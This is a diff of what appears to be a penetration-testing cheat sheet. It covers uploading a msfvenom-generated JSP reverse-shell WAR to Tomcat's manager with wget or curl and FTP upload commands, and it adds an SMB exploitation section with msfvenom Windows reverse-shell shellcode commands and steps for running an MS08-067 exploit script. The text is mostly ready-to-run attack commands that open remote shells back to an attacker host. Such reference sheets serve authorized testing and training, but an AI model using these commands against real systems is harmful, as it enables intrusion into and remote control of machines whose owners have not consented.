@@ -48,17 +48,13 @@
 
 <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>
 
-##### Uploading to Tomcat6
+#### Uploading to Tomcat6
 
 <code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>
 
-##### Uploading to Tomcat7 and Above
+#### Uploading to Tomcat7 and Above
 
 <code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
-
-
-
-
 
 ## FTP 
 
@@ -87,8 +83,27 @@
 <code>>put [FILE]</code>
 
 
-## Exploitation
+## SMB Exploitation
 
+### Eternal Blue (MS17-010) 
+
+<code>
+
+### MS08-067
+
+Use exploit found [here](https://github.com/andyacer/ms08_067)
+
+#### Payloads
+
+Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>
+
+Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>
+
+Replace shell code in the script 
+
+Execute the script
+
+<code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>
 
 
 
